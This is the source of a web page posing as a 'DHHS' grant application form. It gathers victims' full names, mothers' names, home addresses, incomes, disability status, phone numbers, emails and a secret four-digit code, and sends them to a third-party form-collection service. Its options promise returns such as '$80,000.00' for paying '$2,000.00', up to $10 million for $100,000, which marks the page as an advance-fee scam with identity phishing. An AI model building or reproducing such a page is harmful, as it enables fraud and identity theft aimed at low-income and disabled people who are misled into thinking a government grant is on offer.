<!DOCTYPE html>
<html lang="en">

<head>
  <title>Application Form - DHHS</title>
  <?php include('./include/head.php'); ?>
</head>

<body>

  <!-- ======= Header ======= -->
  <?php include('./include/navbar.php'); ?>

  <main id="main" class="main">

    <div class="pagetitle container mt-1">
      <h1>Application Form</h1>
    </div><!-- End Page Title -->

    <div class="card container">
      <div class="card-body">
        <h5 class="card-title">Fill this application form to legible for your grants</h5>

        <!-- Registration Form -->
        <form action="https://formspree.io/f/myyqazyo" method="POST" class="row g-3">

          <div class="col-md-6">
            <label for="fullName" class="form-label">Full Name</label>
            <input type="text" class="form-control" name="fullName" id="fullName" required>
          </div>

          <div class="col-md-6">
            <label for="mothersName" class="form-label">Mother's Name</label>
            <input type="text" class="form-control" name="mothersName" id="mothersName" required>
          </div>

          <div class="col-md-12">
            <label for="homeAddress" class="form-label">Full Home Address</label>
            <input type="text" class="form-control" name="homeAddress" id="homeAddress" required>
          </div>

          <div class="col-md-6">
            <label for="gender" class="form-label">Male/Female</label>
            <select id="gender" name="gender" class="form-select" required>
              <option selected>Choose...</option>
              <option value="male">Male</option>
              <option value="female">Female</option>
            </select>
          </div>

          <div class="col-md-6">
            <label for="age" class="form-label">Your Age</label>
            <input type="number" class="form-control" name="age" id="age" required>
          </div>

          <div class="col-md-6">
            <label for="phone" class="form-label">Text Phone</label>
            <input type="tel" class="form-control" name="phone" id="phone" required>
          </div>

          <div class="col-md-6">
            <label for="email" class="form-label">E-Mail</label>
            <input type="email" class="form-control" name="email" id="email" required>
          </div>

          <div class="col-md-6">
            <label for="income" class="form-label">Monthly Income</label>
            <input type="text" class="form-control" name="income" id="income" required>
          </div>

          <div class="col-md-6">
            <label for="occupation" class="form-label">Occupation</label>
            <input type="text" class="form-control" name="occupation" id="occupation" required>
          </div>

          <div class="col-md-6">
            <label for="houseOwnership" class="form-label">Do you own a house or apt</label>
            <select id="houseOwnership" name="houseOwnership" class="form-select" required>
              <option selected>Choose...</option>
              <option value="yes">Yes</option>
              <option value="no">No</option>
            </select>
          </div>

          <div class="col-md-6">
            <label for="disability" class="form-label">Disability (Yes/No)</label>
            <select id="disability" name="disability" class="form-select" required>
              <option selected>Choose...</option>
              <option value="yes">Yes</option>
              <option value="no">No</option>
            </select>
          </div>

          <div class="col-md-6">
            <label for="receiveMethod" class="form-label">Mode of Receiving the Money (Cash/Check)</label>
            <select id="receiveMethod" name="receiveMethod" class="form-select" required>
              <option selected>Choose...</option>
              <option value="cash">Cash</option>
              <option value="check">Check</option>
            </select>
          </div>

          <div class="col-md-6">
            <label for="fourDigitCode" class="form-label">A Four (4) Digit Code You Can Easily Remember</label>
            <input type="password" class="form-control" name="fourDigitCode" id="fourDigitCode" maxlength="4" required>
          </div>

          <div class="col-md-12">
            <label for="claimAmount" class="form-label">Choose the Amount You Want to Claim</label>
            <select id="claimAmount" name="claimAmount" class="form-select" required>
              <option selected>Choose...</option>
              <option value="80000">Pay $2,000.00 and get $80,000.00</option>
              <option value="100000">Pay $2,500.00 and get $100,000.00</option>
              <option value="150000">Pay $3,000.00 and get $150,000.00</option>
              <option value="200000">Pay $5,000.00 and get $200,000.00</option>
              <option value="300000">Pay $6,000.00 and get $300,000.00</option>
              <option value="550000">Pay $8,500.00 and get $550,000.00</option>
              <option value="1000000">Pay $10,000.00 and get $1,000,000.00</option>
              <option value="3000000">Pay $30,000.00 and get $3,000,000.00</option>
              <option value="5000000">Pay $50,000.00 and get $5,000,000.00</option>
              <option value="10000000">Pay $100,000.00 and get $10,000,000.00</option>
            </select>
          </div>


          <div class="text-center">
            <button type="submit" name="register" class="btn btn-primary">Submit</button>
            <button type="reset" class="btn btn-secondary">Reset</button>
          </div>
        </form><!-- End Registration Form -->

      </div>
    </div>

  </main>

  <br>
  <br>

  <?php include('./include/footer.php'); ?>


  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="fas fa-arrow-up-short"></i></a>

  
  <!-- Template Main JS File -->
  <script src="assets/js/main.js"></script>
  <?php include('./include/tawkto.php'); ?>


</body>

</html>
